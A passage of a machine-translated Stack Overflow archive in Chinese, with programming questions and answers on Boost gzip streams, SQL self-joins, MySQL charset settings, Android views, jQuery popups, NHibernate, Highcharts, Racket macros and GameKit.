#include <boost/iostreams/categories.hpp> // input_filter_tag
#include <boost/iostreams/operations.hpp> // get
#include <boost/iostreams/filtering_stream.hpp>
#include <boost/iostreams/copy.hpp>
#include <boost/iostreams/device/file_descriptor.hpp>
#include <boost/iostreams/device/file.hpp>
#include <boost/iostreams/device/array.hpp>
#include <boost/iostreams/filter/zlib.hpp>

using namespace std;
namespace io = boost::iostreams;

int main() 
{

    if(true)
    {

        string infile_path = "c:\\Temp\\directors.list.gz";
        ifstream infile(infile_path, ios_base::in | ios_base::binary);
        io::filtering_streambuf<io::input> in; //filter
        in.push(io::zlib_decompressor());       
        in.push(infile); 

        //output to cout
        io::copy(in, cout);
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T00:46:48.390

gzip 文件格式在 zlib 数据周围有一个额外的标头，zlib 无法读取该标头。

所以你想使用 boost 的**gzip_decompressor**而不是 zlib_decompressor。

```
in.push(gzip_decompressor()); 
```

请注意，您需要包含*boost/iostreams/filter/gzip.h*而不是*boost/iostreams/filter/zlib.h*。

这是一个流式传输 GZIP 文件的工作示例：

```
#include <fstream>
#include <iostream>
#include <boost/iostreams/filtering_streambuf.hpp>
#include <boost/iostreams/filter/gzip.hpp>
#include <boost/iostreams/copy.hpp>

using namespace boost::iostreams;

int main()
{
    std::ifstream file("hello.gz", std::ios_base::in | std::ios_base::binary);
    filtering_streambuf < input > in;
    in.push(gzip_decompressor());
    in.push(file);
    boost::iostreams::copy(in, std::cout);
} 
```

您可以在 boost 的文档中找到有关特定 boost::iostreams 过滤器的更多信息：http: [//www.boost.org/doc/libs/1_46_1/libs/iostreams/doc/quick_reference.html#filters](http://www.boost.org/doc/libs/1_46_1/libs/iostreams/doc/quick_reference.html#filters)

我还觉得我应该指出您的代码没有使用 gcc 编译：在 C++ 标准库中，*ifstream*构造函数采用*const char* *，而不是*std::string*。（我不确定微软的版本）。

# sql - SQL 自引用查询。加入

> ID：10862633
> 
> 赞同：3
> 
> 时间：2012-06-02T13:22:21.463
> 
> 标签：sql, self-reference

我需要查询单元先决条件的自引用关系。

我知道您需要使用两个连接，我是否选择我的列然后将其连接到自身？

```
SELECT u.unit_code,
   u.name + ' is a prerequisite of ' + u.name AS unit_prerequisite

FROM units AS u 
```

到目前为止，这就是我所拥有的，不确定我必须在哪里加入？甚至不确定第一部分是否正确。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T13:26:35.540

您可以通过在自引用列上将表连接到自身来做到这一点：

```
SELECT 
    u.unit_code, 
    u1.name + ' is a prerequisite of ' + u2.name AS unit_prerequisite 
FROM 
    units AS u1
    inner join units u2 on u2.RefId = u1.RefId 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:26:29.610

您将需要您`JOIN`自己，类似于以下内容：

```
SELECT u1.unit_code,
   u1.name + ' is a prerequisite of ' + u2.name AS unit_prerequisite

FROM units  u1
INNER JOIN units u2
    ON u1.id = u2.id 
```

# silverlight - 调用 Web 服务以使用 Windows Phone 时出错

> ID：10862637
> 
> 赞同：1
> 
> 时间：2012-06-02T13:23:21.547
> 
> 标签：silverlight, web-services, windows-phone-7

我正在使用带有 Silverlight 5 框架的 Windows 7 和 Visual Studio .NET 2010。

我正在使用来自[YouTube](http://www.youtube.com/watch?v=RQ51c0TbI2I&feature=channel&list=UL)的视频教程，介绍如何使用 Web 服务创建 Windows 手机应用程序。

问题是，当我添加 Web 服务“http://msrmaps.com/TerraService2.asmx”时，一旦添加了服务引用，我就会得到很多我不明白的错误。

我按如下方式调用 Web 服务：

1.  在解决方案资源管理器中，右键单击并选择“添加服务引用”
2.  将上面的 URL 粘贴到地址框中
3.  点击前往
4.  接受提供的命名空间或为命名空间键入另一个有效名称。在我的案例中，我将其命名为 TerraService。
5.  构建项目。

**警告和错误**

```
Warning 1   Custom tool warning: Cannot import wsdl:portType
Detail: An exception was thrown while running a WSDL import extension: System.ServiceModel.Description.DataContractSerializerMessageContractImporter
Error: Could not load type 'System.Runtime.Serialization.DataContractSet' from assembly 'System.Runtime.Serialization, Version=2.0.5.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e'.
XPath to Error Source: //wsdl:definitions[@targetNamespace='http://msrmaps.com/']/wsdl:portType[@name='TerraServiceSoap']   c:\users\botoeo\documents\visual studio 2010\Projects\OpenEye\OpenEye\Service References\TerraService\Reference.svcmap

Warning 2   Custom tool warning: Cannot import wsdl:binding
Detail: There was an error importing a wsdl:portType that the wsdl:binding is dependent on.
XPath to wsdl:portType: //wsdl:definitions[@targetNamespace='http://msrmaps.com/']/wsdl:portType[@name='TerraServiceSoap']
XPath to Error Source: //wsdl:definitions[@targetNamespace='http://msrmaps.com/']/wsdl:binding[@name='TerraServiceSoap']    c:\users\botoeo\documents\visual studio 2010\Projects\OpenEye\OpenEye\Service References\TerraService\Reference.svcmap

Warning 3   Custom tool warning: Cannot import wsdl:port
Detail: There was an error importing a wsdl:binding that the wsdl:port is dependent on.
XPath to wsdl:binding: //wsdl:definitions[@targetNamespace='http://msrmaps.com/']/wsdl:binding[@name='TerraServiceSoap']
XPath to Error Source: //wsdl:definitions[@targetNamespace='http://msrmaps.com/']/wsdl:service[@name='TerraService']/wsdl:port[@name='TerraServiceSoap']    c:\users\botoeo\documents\visual studio 2010\Projects\OpenEye\OpenEye\Service References\TerraService\Reference.svcmap

Warning 4   Custom tool warning: No endpoints compatible with Silverlight 3 were found. The generated client class will not be usable unless endpoint information is provided via the constructor.  c:\users\botoeo\documents\visual studio 2010\Projects\OpenEye\OpenEye\Service References\TerraService\Reference.svcmap

Warning 5   Custom tool warning: Exception has been thrown by the target of an invocation.  c:\users\botoeo\documents\visual studio 2010\Projects\OpenEye\OpenEye\Service References\TerraService\Reference.svcmap

Error   6   Custom tool error: Failed to generate code for the service reference 'TerraService'.  Please check other error and warning messages for details.    c:\users\botoeo\documents\visual studio 2010\Projects\OpenEye\OpenEye\Service References\TerraService\Reference.svcmap 
```

我如何摆脱这些警告和错误。这是什么原因造成的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-02T14:59:59.083

我找到了解决这个问题的方法。我只是将我的 Windows Phone SDK 更新到了最新版本。最新版本可以在[这里](http://www.microsoft.com/en-us/download/details.aspx?id=29233)找到。下载最新的更新安装程序。保存您的解决方案并关闭 Visual Studio。使用下载的文件更新您的 Windows Phone SDK。一旦完成。再次打开您的 Visual Studio。它会顺利工作。

# c# - 如何在我的 WinForms 应用程序中保存和检索非拉丁字符？

> ID：10862641
> 
> 赞同：0
> 
> 时间：2012-06-02T13:23:59.740
> 
> 标签：c#, mysql, ado.net, non-latin, character-encoding

我有一个 WinForms 应用程序，它应该能够保存（到 db）并稍后显示非拉丁字符。我知道它与字符集有关。我的数据库和所有表的默认字符集都设置为 utf8。但这仍然不能保存保留其怪异的非拉丁字符:)。

经过一番谷歌搜索和 SO-ing 之后，我知道这是关于`SET NAMES 'utf8'`. 但是我在哪里应用这个？SO上有很多类似的线程处理php，他们说必须`SET NAMES 'utf8'`在查询开始时包含。但是在我的代码中，有数百个查询，并且修补每个地方都是一团糟。

如果我需要为此配置 MySQL，那么可以通过编程方式完成吗？我希望通过在连接字符串中设置它来解决一些问题。

我试过这个：

```
conString = "SERVER=localhost;DATABASE=hi;UID=root;PASSWORD=;Min Pool Size=0;Max Pool Size=200;SET NAMES 'utf8'"; 
```

这给出了运行时错误，说连接字符串的格式不正确。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T13:31:48.983

[这个](https://stackoverflow.com/a/5948149/661933)答案说`The collation is only used for sorting and comparison, not for saving data.`

我试过这个，效果很好。

```
conString = "SERVER=localhost;DATABASE=hi;UID=root;PASSWORD=;Min Pool Size=0;Max Pool Size=200;charset=utf8;"; 
```

**编辑：**让我完成它。

[.NET 连接器手册](http://dev.mysql.com/doc/refman/5.1/en/connector-net-connection-options.html)说`"CharSet specifies the character set that should be used to encode all queries SENT TO THE SERVER. Resultsets are still returned in the character set of the result data."`

意思是：

1，`charset=utf8`只有在将数据保存到数据库时才需要设置，而在检索时不需要设置，因为.NET连接器会以其保存的格式检索它。我并不是说在读取数据时必须修改连接字符串才能删除`charset=utf8`，不。它是双向的。只是明确表示只有明确保存才需要`charset=utf8`.

2，您的数据库将其默认字符集设置为 utf8 甚至不是最重要的。如果您在连接字符串中将字符集定义为 utf8，即使是 latin1 也可以

我测试了上述情况。

# mod-rewrite - CodeIgniter 的 .htaccess URL 重写不起作用

> ID：10862642
> 
> 赞同：0
> 
> 时间：2012-06-02T13:24:00.080
> 
> 标签：mod-rewrite, codeigniter-2

`.htaccess`我有以下内容`/home/domain/public_html/subfolder`

```
RewriteEngine on
RewriteBase /
RewriteCond $1 !^(index\.php|user_guide|robots\.txt)
RewriteRule ^(.*)$ public/index.php?/$1 [L] 
```

但这不起作用[http://domain.com/subfolder/](http://domain.com/subfolder/)

> 文件不存在：`/home/domian/public_html/public`

我显然把我的重写规则搞砸了。整个 CI 应用程序位于 Web 根目录的子文件夹中。

```
/home/domain/public_html/subfolder
[sssss@ff subfolder]$ ls
application  license.txt  public  system  user_guide 
```

index.php 是公开的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-03T06:23:10.163

首先，您的 index.php 应该与应用程序和系统位于同一目录中。

一旦你移动它，在你的 .htaccess 中试试这个

```
RewriteEngine on
RewriteBase /subfolder/
RewriteCond $1 !^(index\.php|user_guide|robots\.txt)
RewriteRule ^(.*)$ index.php?/$1 [L] 
```

另外在一个不相关的注释中，我会删除用户指南目录，因为它包含的所有内容都可以在[CodeIgniter Site](http://codeigniter.com/user_guide/)上访问。

# android - 自定义视图的 onDraw 接收不同大小的画布

> ID：10862643
> 
> 赞同：1
> 
> 时间：2012-06-02T13:24:06.033
> 
> 标签：android, android-canvas, ondraw

我有一个从 ImageView 派生的类：

```
public class TouchView extends ImageView
{
   @Override
   protected void onDraw(Canvas canvas)
   ... 
```

touchview 仅在活动的 onCreate 中创建一次，并使用 SVG 文件中的可绘制对象填充。

```
ImageView imageView = new TouchView(this);
imageView.setScaleType(ImageView.ScaleType.MATRIX);
FrameLayout f = (FrameLayout)findViewById(R.id.frame2);
FrameLayout.LayoutParams l = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.FILL_PARENT, FrameLayout.LayoutParams.FILL_PARENT);
f.addView(imageView, l);
...
is = openFileInput(svgname);
svg = SVGParser.getSVGFromInputStream(is);
is.close();

Drawable d = svg.createPictureDrawable();
imageView.setImageDrawable(d); 
```

所有的环境始终保持不变。然而，在 onDraw 方法中，我在事件之间得到了不同大小的画布。那是代码：

```
protected void onDraw(Canvas canvas)
{
  super.onDraw(canvas);
  Log.v("DRAW", " w= " + canvas.getWidth() + " h=" + canvas.getHeight());
  ...
} 
```

生成带有线条的日志，其中画布的宽度和高度从正常的 1024*728（这是平板电脑上的正确视图尺寸）到 200*160（在我的图纸中引入错误的奇怪事物）来回变化。我很尴尬。

对于相同的视图/可绘制对象，画布是否应该始终具有相同的大小？文档说 getWidth 和 getHeight 方法返回当前绘图*层*的尺寸，但不清楚是什么层，其中有多少是为“幕后”的画布创建的，以及如何控制这个过程。

我很感激任何关于如何获得一致的绘图行为的解释，特别是通过获取正在绘制的视图的实际大小`onDraw`。

目前，我正在使用调用视图的 getDrawingRect 的工作区，但我不确定这是一种正确的方法，因为似乎 的`canvas`参数`onDraw`对于绘图大小应该是完全足够的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-24T01:52:37.370

我遇到了同样的问题，这是我的解决方法，希望对你有帮助

```
protected void onDraw(Canvas c) {
    super.onDraw(c);
    int w = getWidth(), h = getHeight();
    // resize
Matrix resize = new Matrix();
resize.postScale((float)Math.min(w, h) / (float)mMarker.getWidth(), (float)Math.min(w, h) / (float)mMarker.getHeight());
imageScaled = Bitmap.createBitmap(mMarker, 0, 0, mMarker.getWidth(), mMarker.getHeight(), resize, false);

c.drawBitmap(imageScaled, 0,0, paint);

} 
```

其中 mMarker 在自定义 ImageView 构造函数中定义。

```
...
private Bitmap mMarker, imageScaled;
Paint paint = new Paint();

//Java constructor
public AvatarImageView(Context context) {
    super(context);
    init();
}

//XML constructor
public AvatarImageView(Context context, AttributeSet attrs) {
    super(context, attrs);
    init();
}

private void init() {
    // load the image only once
    mMarker = BitmapFactory.decodeResource(getResources(), R.drawable.silhouette_48);
    mMarker.setHasAlpha(true);paint.setColor(Color.WHITE);
    paint.setStyle(Paint.Style.STROKE);
    paint.setStrokeWidth(4);

    //invalidate(); // don't know if I need this
} 
```

# javascript - 在以下情况下通过 jQuery 添加 DISPLAY: NONE 到跨度：鼠标单击跨度外部，或单击 EXIT 按钮等+

> ID：10862649
> 
> 赞同：1
> 
> 时间：2012-06-02T13:25:07.647
> 
> 标签：javascript, jquery, function

我想要的真的很简单，但是每次我尝试添加我想要的功能时，我都会把事情搞砸，所以我决定寻求帮助并坚持我现在拥有的工作基本脚本。

我已经有一个正在编写的脚本，我想开发它几乎完全像这样工作： [https ://stackoverflow.com/a/7133084/1399030](https://stackoverflow.com/a/7133084/1399030) **{** [http://jsfiddle.net/Paulpro/YpeeR/25/](http://jsfiddle.net/Paulpro/YpeeR/25/) **}** （作者：**PaulP.RO**）

*   打开一个隐藏的跨度
*   隐藏隐藏的跨度
*   跨度有“关闭”按钮退出跨度
*   触发另一个跨度时隐藏当前打开的跨度

想想...**图片库预览功能**...有点。

当在网页上单击`.popCover`或单击时触发“预览”跨度，这个**隐藏的跨度**将根据其指定**的唯一 id**显示，通过 jQuery 插入到其 css 中。 这是在一个包含多个项目的循环内。 `a.thumbnail`****`display: block;`**** 

 ****我已经做到了这一点，这是我使用的工作脚本：

```
$(document).ready(function() {

    $('.popCover').click(function(){ 
     divID = $(this).attr('id');
        $("#tooltip-"+divID).fadeIn('5000', function() {
        $("#tooltip-"+divID).css("display", "block");
        });
    });

    $("a.thumbnail").click(function() {
     dvID = $(this).attr('id');
        $("#tooltip-"+dvID).fadeIn('5000', function() {
        $("#tooltip-"+dvID).css("display", "block");
        });
    });

}); 
```

但是现在，我需要在这些函数中添加触发器以**使跨度再次消失**，（通过插入`display: none;`其 css.

**我希望 CURRENT SPAN 在以下情况下消失：**
**01.**在跨度元素之外单击鼠标
**02.**在跨度内单击**退出**或**X**按钮。（就像在图像库中，当他们预览图像时，通过单击元素外部或预览中提供的退出按钮退出它）
**03.** `.popCover`或被`a.thumbnail`重新单击（可能会触发另一个不同 ID 的跨度来显示。 )

**注意：**
目前，我可以在页面上单击尽可能多的锚点，所有这些具有不同 ID 的跨度只是在页面上累积并相互叠加。我真的不想要那个。**我不希望一次打开超过 1 个跨度**，因此我希望添加功能，使当前打开的跨度在再次单击锚点时自行退出。

我自己确实尝试过这样做，但是...我无法获得我尝试过的方法。因为我不是 jQuery 专家，所以将所有这些函数加在一起太复杂了。我可以让一个工作，然后通过尝试在另一个工作来破坏它。

另外，我正在考虑使用这种类似的方式退出跨度：

```
$(".the_span").fadeOut("5000").css("display", "none"); 
```

我不愿意只使用一些插件和简单的东西的唯一原因是，我已经非常喜欢我的“预览”跨度 css，我已经准备好了。我只需要 jquery 部分来工作：

`display: block`触发时的跨度，如果满足`display: none`上述条件。

希望得到帮助，将非常感谢每一位！谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-03T06:27:36.737

我终于让这个工作了！**:o)**

通过使用检查`if ($("span.the_span").is(":visible"))`跨度当前是否**可见**`class="the_span"`/打开/或在其 CSS 中具有**display: 块，如果***是*，则：
**- 在继续显示新跨度之前隐藏当前打开的跨度。-**

这是我的**工作成品**，它解决了我想要的所有功能：

```
 $(document).ready(function() {

   // When clicks on either ".popCover" or "a.thumbnail" is made,
   // Funcion clickPOP is triggered:
   var clickPOP = function() {
        divID = $(this).attr('id'); 

        // Checks if "span.the_span" is already currently open:
        if ($("span.the_span").is(":visible")) {
        $("span.the_span").css("display", "none"); // If open, this is where it closes it..
        $("#tooltip-"+divID).fadeIn('200', function() { // Then, proceeds to open the new clicked span here.
                $("span.the_span #tooltip-"+divID).css("display", "block"); });
              }

         // But if no "span.the_span" is currently open:
         // No need to close anything, it will directly open the new span...
         else { 
            $("#tooltip-"+divID).fadeIn('5000', function() {
                $("span.the_span #tooltip-"+divID).css("display", "block"); });
                }
  } // End of Function. Added functionality starts below...

        // Exits "span.the_span" when mouse clicks outside of element
        // ... ("Outside of element" means: outside of "span.the_span")
        $(document).click(function(){
        $("span.the_span").css("display", "none");
        });

        // Exit Button : Exits "span.the_span" when exit button is clicked
        $('span.exitme').css('cursor', 'pointer').click(function(e){
        $("span.the_span").css("display", "none");
        e.stopPropagation();
        });

        // This makes sure that clicks inside "span.the_span" continue to work
        $('span.the_span').click(function(e){
        e.stopPropagation();
        });

        // This makes sure that clicks on ".popCover" continue to work
        $(".popCover").click(function(e){
        e.stopPropagation();
        });

        // This makes sure that clicks on "a.thumbnail" continue to work
        $("a.thumbnail").click(function(e){
        e.stopPropagation();
        });

// Clicks on both ".popCover" & "a.thumbnail"
// ... will trigger actions specified on function: clickPOP.
$(".popCover").click(clickPOP);
$("a.thumbnail").click(clickPOP);

    }); 
```

如您所见，我还添加了`$(document).click(function()`etc. 以获得我最初想要的功能，**即当鼠标在元素外部单击时隐藏跨度**，但确保在`.popCover` *(div)*或`a.thumbnail` *(链接）*在网页上。

此外，如果没有这些帖子的提示，我将无法完成编写此方法：
*** 运行相同的功能/不同的触发器：** [https ://stackoverflow.com/a/1191837/1399030](https://stackoverflow.com/a/1191837/1399030)
*** 修复单击内部元素（包括退出按钮）：** [https ://stackoverflow.com/a/4660691/1399030](https://stackoverflow.com/a/4660691/1399030)
***如何检查某些东西是否隐藏或可见：** [https ://stackoverflow.com/a/178450/1399030](https://stackoverflow.com/a/178450/1399030)

我特别发现最后一篇文章非常有帮助（基本上它让我明白了我在做什么），因为海报：**Tsvetomir Tsonev**包含在他的代码注释中：

```
// Checks for display:[none|block], ignores visible:[true|false]" 
```

我最初并不真正理解 jQuery 能够检查或连接非内联的 CSS（我自己是一个 jQuery 菜鸟），所以那篇文章确实很有启发性。

* * *

当然，如果有更好、更有效的方法来做到这一点，我会很高兴能得到更多的启发！**jQuery**对我来说仍然是一个学习曲线，我是一个非常渴望的学生！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T13:47:38.577

您必须尝试在打开/活动元素上添加一个类，然后绑定所有事件以关闭它。必须对具有类 .active 的元素进行绑定，例如，当关闭时，必须删除 .active 类。****

# nhibernate - nhibernate 查询 SubQueryExpression

> ID：10862654
> 
> 赞同：2
> 
> 时间：2012-06-02T13:25:45.493
> 
> 标签：nhibernate, subquery

有人可以解释一下什么是基于 NHibernate SubQueryExpression 的查询。非常欢迎任何带有具体示例的链接。

谢谢

更新：假设我有一个名为 Beach 的实体。那个海滩可以有很多图像。我想选择海滩实体和它；来自图像集合的第一张图像。我想只携带那个选定的图像对象，或者如果我只选择第二个对象来只携带那个对象。

我不想像 Images.First() 这样访问，因为这将初始化所有集合，如果您需要更多信息，请询问。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T13:47:36.387

```
var query = session.QueryOver(() => vehicleAlias)
            .Left.JoinAlias(() => vehicleAlias.VehicleRegistrations, () => vehicleRegistrationAlias)
            .WithSubquery.WhereProperty(() => vehicleRegistrationAlias.RegistrationExpiryDate).Eq(
                QueryOver.Of(() => vehicleRegistrationAlias2)
                    .Where(() => vehicleRegistrationAlias2.Vehicle.Id == vehicleAlias.Id)
                    .Select(Projections.Max<VehicleRegistration>(ps => ps.RegistrationExpiryDate)));
        query.Left.JoinAlias(() => vehicleRegistrationAlias.VehicleRegistrants, () => vehicleRegistrantAlias)
            .Where(() => vehicleRegistrantAlias.Client.Id == clientId); 
```

这是我刚刚为我的工作写的一个子查询，我花了一些时间来写。我真的不知道您具体要问什么，但这里有一个示例。如果您对此有任何疑问，请告诉我。

.Select(Projections.Max(ps => ps.RegistrationExpiryDate))) 这一行完成了子查询中的所有工作。它选择最近的车辆登记。车辆登记别名 2 是作为子查询查询的对象。

因此，这将仅撤回车辆的当前车辆登记。一辆车可能有许多车辆登记。它的 .Select 语句可以修改为 .OrderById.Desc.SelectTop(1) 或类似的东西。

我希望这个编辑有帮助。

# java - EditText - 键入时更改文本

> ID：10862657
> 
> 赞同：16
> 
> 时间：2012-06-02T13:26:11.170
> 
> 标签：java, android

我需要在键入时替换 EditText 中的文本：示例：如果用户按下“A”，它将被存储到缓冲区中，并在 EditText 上显示“D”（看起来他按下了“D”）。现在我可以读取按下的字符，但我不能在 et 中显示任何字符以避免 stackoverflow ：

```
final EditText et = (EditText) findViewById(R.id.editTexts);
    final TextView tv = (TextView) findViewById(R.id.textView2);

    et.addTextChangedListener(new TextWatcher()
    {
            public void afterTextChanged(Editable s){}
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {

            } 
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                if(s.length() > 0) {
                    tv.setText(s.toString().substring(s.length()-1));
                    et.setText("");
                }
            }
    }); 
```

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-06-02T13:55:14.157

您可以根据需要更改它::

```
public class SampleActivity extends Activity {
    TextWatcher tt = null;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        final EditText et = (EditText) findViewById(R.id.editText1);
        final TextView tv = (TextView) findViewById(R.id.textView1);
        tt = new TextWatcher() {
           public void afterTextChanged(Editable s){
                et.setSelection(s.length());
           }
           public void beforeTextChanged(CharSequence s,int start,int count, int after){} 
           public void onTextChanged(CharSequence s, int start, int before, int count) {
               et.removeTextChangedListener(tt);
               et.setText(et.getText().toString().replace("A", "C"));
               et.addTextChangedListener(tt);
           }
       };
       et.addTextChangedListener(tt);
   }
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-11-06T16:12:00.163

为了以交互方式更改文本，您需要注册一个`TextWatcher`. 但是尝试更改观察者内部的文本会导致对观察者的进一步调用。我的技巧是在我想更改文本时暂时删除观察者，然后立即重新注册

```
 mEditText.addTextChangedListener(new TextWatcher() {
        @Override public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) { }
        @Override public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) { }
        @Override public void afterTextChanged(Editable editable) {
            mEditText.removeTextChangedListener(this);
            mEditText.setText(//TODO change whatever you like here);
            mEditText.setSelection(editable.length()); //moves the pointer to end
            mEditText.addTextChangedListener(this);
        } 
```

# charts - Highcharts 删除 x 轴上的空间

> ID：10862662
> 
> 赞同：3
> 
> 时间：2012-06-02T13:27:12.817
> 
> 标签：charts, highcharts

我正在尝试使用 Highcharts 库构建面积图。突然间，我发现在我的实际数据开始之前，x 轴上有一些间距。我想用适当的数据从 [0,0] 轴开始图表。

![图表](../Images/bcc278cdc9ba6fd4ecc94a1cc58801d5.png)

```
<?php 
    $data1 = array(3300, 3000, 4300, 4200, 2900, 1900, 1800); 
?>
<script type="text/javascript">$(function () {
var chart = new Highcharts.Chart({
    chart: {
        renderTo: 'areachart',
        type: 'area'
    },
    title: {
            text: 'People'
    },
    credits: {
        enabled: false
    },
    xAxis: {
        startOnTick: false,
        categories: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']
    },
    yAxis: {
        title: {
            text: null
        },
        labels: {
                formatter: function() {
                    return this.value;
                }
        }
    },
    plotOptions: {
        area:{
            dataLabels: {
                enabled: true
            }
        }
    },
    series: [{
        data: [<?php foreach($data1 as $da):
                        echo $da.', ';
                     endforeach;
               ?>
              ]
    }]
});
});
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-06T18:34:49.047

好消息，这是可能的……有一些警告。

```
xAxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
        min:0.5,
        max:10.5,
        tickInterval:1,
        maxPadding:0,
        endOnTick:false,
        startOnTick:false
    } 
```

[http://jsfiddle.net/eg9jn/](http://jsfiddle.net/eg9jn/)

以下是重要的位： 最小值和最大值设置为图表“内部”的 0.5。start/endOnTick 设置为 false。

一个警告：当只有两个类别时，这不起作用......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-03T19:33:04.857

这是不可能的，因为您正在为`xAxis`. 类别的标签和点始终设置在类别的中间。因此，第一个和最后一个类别具有您想要摆脱的差距。
但在这种情况下，这不是一个错误，而是一个特性。

您可以尝试修改您`xAxis`的使用法线轴并使用自定义标签格式化程序来显示日期而不是数字。

# google-api - Java google api 离线访问

> ID：10862663
> 
> 赞同：3
> 
> 时间：2012-06-02T13:27:31.147
> 
> 标签：google-api, google-analytics-api

我在哪里可以找到离线访问 google API 的 java 示例？

我的后台 java 进程需要从 Analytics 下载数据。我找到了本教程： [https](https://developers.google.com/analytics/resources/tutorials/hello-analytics-api#create_service_object) ://developers.google.com/analytics/resources/tutorials/hello-analytics-api#create_service_object 它有效，但没有解释如何执行离线访问。

在 HelloAnalyticsApiSample 中，用户使用浏览器检索所有令牌。...但是当访问令牌过期时，如何在不使用浏览器的情况下使用刷新的访问令牌实例化“凭据”java 对象？本教程中不存在这种情况。是否存在使用 java 库的离线访问示例？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-24T09:49:00.663

查看[https://developers.google.com/accounts/docs/OAuth2WebServer#offline](https://developers.google.com/accounts/docs/OAuth2WebServer#offline)了解如何获得离线访问和使用刷新令牌。

# racket - 我什么时候应该使用 syntax/loc 而不是 #' （又名语法）？

> ID：10862665
> 
> 赞同：6
> 
> 时间：2012-06-02T13:27:42.360
> 
> 标签：racket

一个新的语法对象可以由[`syntax/loc`](http://pre.racket-lang.org/docs/html/reference/stx-patterns.html?q=syntax#%28form._%28%28lib._racket/private/stxcase-scheme..rkt%29._syntax/loc%29%29)和[`syntax`](http://pre.racket-lang.org/docs/html/reference/stx-patterns.html?q=syntax#%28form._%28%28lib._racket/private/stxcase-scheme..rkt%29._syntax%29%29)（也写成`#'`）来构造。

我应该什么时候使用`syntax/loc`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-02T13:27:42.703

当你不构造一个新的语法对象时使用`#'`(ie `syntax`)，就像你只是引用一个用`syntax-case`or绑定的模式变量一样`with-syntax`。

用于`#'`临时语法对象，如`(syntax->list #'(id ...))`.

用于`#'`表示您知道其中不会有语法错误的表单的语法对象，或者其中的语法错误是您的宏实现的错误，而不是您的宏的使用。

当您构造由于宏使用`syntax/loc`不正确而可能包含语法错误的表达式时使用。

让我们考虑一个具体的例子：

表单`display-let`应该像 normal 一样工作`let`，除了它在评估正文之前显示绑定的值。

这是第一个实现：

```
(define-syntax (display-let-1 stx)
  (syntax-case stx ()
    [(_ ([id expr] ...) body ...)
     #'((lambda (id ...) 
          (displayln (format "~a is bound to ~a" 'id id)) ...
          body ...)
        expr ...)])) 
```

以下是正确使用宏的示例：

```
> (display-let-1 ([x 1] [y 2]) (+ x y))
x is bound to 1
y is bound to 2
3 
```

现在让我们看看当宏使用不正确时会发生什么：

```
> (display-let-1 ())
lambda: bad syntax in: (lambda ()) 
```

这种用法是不正确的，因为使用`let`必须总是有一个非空的主体。除了打印错误消息外，DrRacket 将此代码涂成红色：

```
(lambda (id ...) 
  (displayln (format "~a is bound to ~a" 'id id)) ...
  body ...) 
```

虽然`lambda`宏构造的表达式不正确是正确的，`(lambda ())`是不合法的，但这不是由于宏中的错误，而是由于宏的使用不正确。

要重定向责备，将构造的`lambda`表达式用`syntax/loc`并使用`syntax/loc`as place 的第一个参数来着色为红色。

```
(define-syntax (display-let-2 stx)
  (syntax-case stx ()
    [(display-let ([id expr] ...) body ...)
     #`(#,(syntax/loc stx (lambda (id ...) body ...)) expr ...)]))

> (display-let-2 ())
display-let-2: bad syntax in: (display-let-2 ()) 
```

这一次，`(display-let-2 ())`在 repl 中输入的内容是红色的，并且提到的错误消息`display-let-2`不是`lambda`.

# ios - 使用 Gamekit 时如何通过 WiFi 建立连接？

> ID：10862670
> 
> 赞同：5
> 
> 时间：2012-06-02T13:28:17.033
> 
> 标签：ios, wifi, p2p, gamekit

我想使用 GameKit 通过 WiFi 在两个设备之间建立连接。苹果的文件说

> 如果选择了 Internet 连接，您的应用程序必须关闭对等选择器对话框并显示其自己的用户界面来完成连接。

这就是我所做的

```
- (void)peerPickerController:(GKPeerPickerController *)picker didSelectConnectionType:(GKPeerPickerConnectionType)type
{
if (type == GKPeerPickerConnectionTypeOnline) 
{
    picker.delegate = nil;
    [picker dismiss];
    [picker autorelease];

    [alert setTitle:@"\n\n\n"];
    [alert setMessage:@"Looking for other iPads, iPhones or iPod touches..."];
    [alert addButtonWithTitle:@"Cancel"];

    UIActivityIndicatorView *progress   = [[UIActivityIndicatorView alloc] initWithFrame:CGRectMake(125, 50, 30, 30)];
    progress.activityIndicatorViewStyle = UIActivityIndicatorViewStyleWhiteLarge;
    [alert addSubview:progress];
    [progress startAnimating];
    [alert show];
}
} 
```

好的，我已经展示了我自己的界面。接下来呢？我如何连接？如何开始寻找同行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-10T05:08:53.393

本[教程](http://www.raywenderlich.com/12735/how-to-make-a-simple-playing-card-game-with-multiplayer-and-bluetooth-part-1)使用 Gamekit 和蓝牙或 wifi 构建点对点纸牌游戏。（链接已更新）

# c# - 使用 HttpModule 拦截目标事件处理程序？

> ID：10862674
> 
> 赞同：-1
> 
> 时间：2012-06-02T13:28:49.783
> 
> 标签：c#, asp.net, httpmodule

